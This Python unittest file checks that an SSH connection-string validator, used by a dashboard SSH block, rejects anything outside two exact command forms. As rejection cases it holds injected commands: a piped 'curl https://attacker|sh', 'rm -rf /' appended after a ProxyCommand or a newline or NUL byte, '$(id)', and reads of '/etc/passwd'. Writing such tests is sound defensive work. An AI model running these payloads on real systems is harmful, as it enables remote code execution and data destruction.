"""Tests for load_ssh_url - the SSH connection-string contract behind the
dashboard SSH block (issue #80). The string is pasted into a shell, so it is
accepted ONLY when it matches one of two exact grammars (chisel / cloudflared)."""
import os
import tempfile
import unittest
from pathlib import Path

from ttydproxy.views import load_ssh_url

CHISEL = "ssh -p 2222 hapi@example.com"
CLOUDFLARED = 'ssh -o ProxyCommand="cloudflared access ssh --hostname %h" hapi@tunnel.example.com'


class TestLoadSshUrl(unittest.TestCase):
    def _write(self, content):
        with tempfile.NamedTemporaryFile("w", suffix=".ssh", delete=False) as f:
            f.write(content)
            path = f.name
        self.addCleanup(os.unlink, path)
        return path

    def test_missing_file_returns_none(self):
        path = Path(tempfile.gettempdir()) / "clihost-nonexistent-ssh-file"
        if path.exists():
            path.unlink()
        self.assertIsNone(load_ssh_url(str(path)))

    def test_empty_file_returns_none(self):
        self.assertIsNone(load_ssh_url(self._write("")))

    def test_whitespace_only_returns_none(self):
        self.assertIsNone(load_ssh_url(self._write("   \n\t  \n")))

    def test_non_ssh_prefix_returns_none(self):
        self.assertIsNone(load_ssh_url(self._write("nc example.com 22")))
        self.assertIsNone(load_ssh_url(self._write("telnet example.com 22")))

    def test_bare_ssh_without_args_returns_none(self):
        self.assertIsNone(load_ssh_url(self._write("ssh")))

    # --- legitimate forms accepted ---

    def test_valid_chisel_command_returned(self):
        self.assertEqual(load_ssh_url(self._write(CHISEL + "\n")), CHISEL)

    def test_valid_cloudflared_command_returned(self):
        self.assertEqual(load_ssh_url(self._write(CLOUDFLARED)), CLOUDFLARED)

    def test_cloudflared_form_keeps_quotes_spaces_percent(self):
        cmd = 'ssh -o ProxyCommand="cloudflared access ssh --hostname %h" hapi@host'
        self.assertEqual(load_ssh_url(self._write(cmd + "\n")), cmd)

    # --- arbitrary ProxyCommand / ssh options rejected (RCE vectors) ---

    def test_arbitrary_proxycommand_rejected(self):
        # ProxyCommand is executed locally by ssh before connecting -> RCE.
        self.assertIsNone(load_ssh_url(self._write('ssh -o ProxyCommand="touch /tmp/pwned" hapi@host')))

    def test_cloudflared_proxycommand_with_payload_rejected(self):
        # The pinned ProxyCommand value must be EXACT; appended payload rejected.
        payload = 'ssh -o ProxyCommand="cloudflared access ssh --hostname %h ; rm -rf /" h@host'
        self.assertIsNone(load_ssh_url(self._write(payload)))

    def test_other_ssh_options_rejected(self):
        for payload in (
            "ssh -F /tmp/evil hapi@host",
            "ssh -o LocalCommand=rm hapi@host",
            "ssh -o PermitLocalCommand=yes hapi@host",
        ):
            with self.subTest(payload=payload):
                self.assertIsNone(load_ssh_url(self._write(payload)))

    # --- structural / field validation ---

    def test_extra_trailing_tokens_rejected(self):
        self.assertIsNone(load_ssh_url(self._write("ssh -p 2222 hapi@host extra")))

    def test_non_numeric_port_rejected(self):
        self.assertIsNone(load_ssh_url(self._write("ssh -p abc hapi@host")))

    def test_host_with_colon_rejected(self):
        self.assertIsNone(load_ssh_url(self._write("ssh -p 2222 hapi@host:22")))

    def test_host_with_slash_rejected(self):
        self.assertIsNone(load_ssh_url(self._write("ssh -p 2222 hapi@host/evil")))

    # --- shell metacharacters rejected (fail to match allowed classes) ---

    def test_shell_metacharacters_rejected(self):
        for payload in (
            "ssh host; curl https://attacker|sh",
            "ssh host & whoami",
            "ssh host `id`",
            "ssh host $(id)",
            "ssh host > /tmp/x",
            "ssh host < /etc/passwd",
            "ssh (host)",
            "ssh host)",
            "ssh host {a}",
            "ssh host \\ whoami",
            "ssh host $HOME",
        ):
            with self.subTest(payload=payload):
                self.assertIsNone(load_ssh_url(self._write(payload)))

    # --- control chars rejected ---

    def test_control_chars_rejected(self):
        for ch in ("\t", "\x01", "\x1f", "\x0b"):
            with self.subTest(ch=repr(ch)):
                self.assertIsNone(load_ssh_url(self._write("ssh -p" + ch + " 22 hapi@h")))

    def test_newline_injection_rejected(self):
        self.assertIsNone(load_ssh_url(self._write("ssh -p 2222 hapi@example.com\nrm -rf /")))

    def test_carriage_return_rejected(self):
        self.assertIsNone(load_ssh_url(self._write("ssh -p 2222 hapi@example.com\recho pwned")))

    def test_nul_byte_rejected(self):
        self.assertIsNone(load_ssh_url(self._write("ssh -p 2222 hapi@example.com\x00rm -rf /")))


if __name__ == "__main__":
    unittest.main()
